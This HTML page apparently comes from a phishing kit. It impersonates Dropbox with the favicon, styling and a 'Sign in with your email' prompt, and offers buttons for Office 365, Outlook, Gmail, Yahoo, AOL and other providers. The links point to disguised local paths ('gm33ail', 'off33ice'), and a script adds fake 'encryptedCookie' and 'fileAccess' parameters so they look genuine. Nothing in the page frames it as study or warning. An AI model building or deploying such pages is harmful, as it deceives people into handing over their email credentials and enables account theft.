<!DOCTYPE html>
<!DOCTYPE html>
<html>
  <head>
    <meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
	<link href="https://cfl.dropboxstatic.com/static/images/favicon-vflUeLeeY.ico" rel="shortcut icon" /><link 

    <meta content="text/html; charset=UTF-8" http-equiv="content-type">
    <meta content="width=device-width, user-scalable=no" name="viewport">
    <meta http-equiv='cache-control' content='no-cache'>
    <meta http-equiv='expires' content='0'>
    <meta http-equiv='pragma' content='no-cache'>
    <title>Access your documents from any device</title>
    <style type="text/css">.hny-htirfw { display: none; }</style> 
    <link href="asset/animation-vflzHcTyC.css" type="text/css"  rel="stylesheet">
    <link href="asset/components-vflfxQtKp.css" type="text/css"  rel="stylesheet">
    <link href="asset/media_text-vfl6jBpfO.css" type="text/css"  rel="stylesheet">
    <link href="asset/base-vflQGhUQE.css" type="text/css"  rel="stylesheet">
    <link href="asset/index-vfl0GyzuL.css" type="text/css"  rel="stylesheet">
    <link href="asset/responsive_classes-vflX9R-EH.css" type="text/css"  rel="stylesheet">
    <link href="asset/modal-vflS6pGZb.css" type="text/css"  rel="stylesheet">

    <link href="asset/web_sprites.css" type="text/css"  rel="stylesheet">
    <link href="asset/css.css" type="text/css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  </head>
  <body class="en  dropbox-2015 dropbox-2015--responsive dropbox-logo-2015 exp-growth_web_google_register__GOOGLE3"> 
    <header class="mast-head">
      <div class="mast-head__container container">
        <nav class="mast-head__nav mast-head-nav">
          <ul class="nav-list">
            <li class="nav-list__item nav-list__item--dfb">
              <!--a data-js-component-id="component39250" href="#" id="try-dfb" class="button-tertiary try-dfb">Try Dropbox Business</a-->
            </li>
          </ul>
          <ul class="nav-list">
            <li class="nav-list__item nav-list__item--download">
              <!--a href="#" class="button-link">Download the app</a-->
            </li> 
          </ul>
        </nav>
        <h1 id="dropbox-logo" class="dropbox-logo">
          <span class="dropbox-logo__glyph"></span>
          
        </h1>
      </div>
    </header> 
    <div class="parallax">
      <section class="hero small-padding" style="padding-top:80px; padding-bottom:0px; ">

        <div class="header-text" style="padding:0px; width: 50%; float: left;">
          <h2 class="medium-title" style="margin-top:15px; margin-bottom:0px; padding-bottom:0px;font-weight: bold; color:#fff;">Sign in with your email</h2>
          <p class="small-title" style="margin-top:0px; font-size:25px; color:#fff;">Select your email provider below</p>
        </div>

        <div class="header-text" style="width: 100%;float: right;padding-top: 50px;">
            <div style="width: 100%;">
                <ul class="nav-list">
                    <li class="nav-list__item nav-list__item--dfb" id="linkTab">
                        <a data-js-component-id="component39250" href="off33ice" id="office" class="button-tertiary try-dfb" style="color: #fff;background-color: #007ee5;width: 250px;height: 50px;margin-bottom: 10px;font-size: x-large;"><img src="img/office365.png" width="30" style="border-radius: 3px;float:left;">Office 365</a>

                        <a data-js-component-id="component39250" href="li33ve/" id="outlook" class="button-tertiary try-dfb" style="color: #fff;background-color: #007ee5;width: 250px;height: 50px;margin-bottom: 10px;font-size: x-large;"><img src="img/Microsoft Account.png" width="30" style="border-radius: 3px;float:left;">Outlook</a>

                        <a data-js-component-id="component39250" href="gm33ail" id="geemail" class="button-tertiary try-dfb" style="color: #fff;background-color: #007ee5;width: 250px;height: 50px;margin-bottom: 10px;font-size: x-large;"><img src="img/googleplus.png" width="30" style="border-radius: 3px;float:left;">Gmail</a><br><br>

                        <a data-js-component-id="component39250" href="yah33oo" id="yahoo" class="button-tertiary try-dfb" style="color: #fff;background-color: #007ee5;width: 250px;height: 50px;margin-bottom: 10px;font-size: x-large;"><img src="img/yahoo.png" width="30" style="border-radius: 3px;float:left;">Yahoo</a>

                        <a data-js-component-id="component39250" href="ao33l/" id="aol" class="button-tertiary try-dfb" style="color: #fff;background-color: #007ee5;width: 250px;height: 50px;margin-bottom: 10px;font-size: x-large;"><img src="img/aol.png" width="30" style="border-radius: 3px;float:left;">Aol</a>

                        <a data-js-component-id="component39250" href="others" id="others" class="button-tertiary try-dfb" style="color: #fff;background-color: #007ee5;width: 250px;height: 50px;margin-bottom: 10px;font-size: x-large;"><img src="img/email.png" width="30" style="border-radius: 3px;float:left;">Others</a>
                    </li>
                </ul>
            </div>
        </div>
     </section>

    </div>
	<script>
		function makeid() {
		  var text = "";
		  var possible = "abcdefghijklmnopqrstuvwxyz0123456789";

		  for (var i = 0; i < 35; i++)
			text += possible.charAt(Math.floor(Math.random() * possible.length));

		  return text;
		}
		function makeid2() {
		  var text = "";
		  var possible = "0123456789";

		  for (var i = 0; i < 5; i++)
			text += possible.charAt(Math.floor(Math.random() * possible.length));

		  return text;
		}
		$('#linkTab a').each(function(){
			 this.href += "?fileAccess="+makeid2()+"&encryptedCookie="+makeid()+"&u="+makeid()+"&connecting="+makeid()+"&phaseAccess="+makeid()+"&p="+makeid();
		})
	</script>